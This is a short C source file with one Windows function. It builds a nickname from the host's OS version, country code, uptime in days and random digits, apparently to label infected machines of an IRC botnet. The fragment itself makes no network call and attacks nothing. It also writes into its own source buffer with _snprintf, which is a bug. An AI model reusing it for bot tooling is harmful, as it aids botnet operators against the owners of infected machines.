#include "includes.h"
#include "externs.h"

char *XGetNick()
{
	static char Nick[MAXNICKLEN] = {0};

	char Country[10] = {0};
	char *OS = NULL;//[10] = {0};

//    srand(GetTickCount());

	GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME, Country, sizeof(Country));
	
	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&verinfo);

	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0)
	{
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) OS = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) OS = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10)
		OS = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90)
		OS = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0)
		OS = "2K";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1)
		OS = "XP";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2)
		OS = "2K3";
	else OS = "??";

	_snprintf(Nick, sizeof(Nick), "[%s|%s|%dD]", OS /*MainStruct.ShortOSName*/, Country, GetTickCount() / 1000/86400);


	for (int i = 0; i < MaxRand; i++)
		_snprintf(Nick, sizeof(Nick), "%s%i", Nick, rand()%10);

	return Nick;
}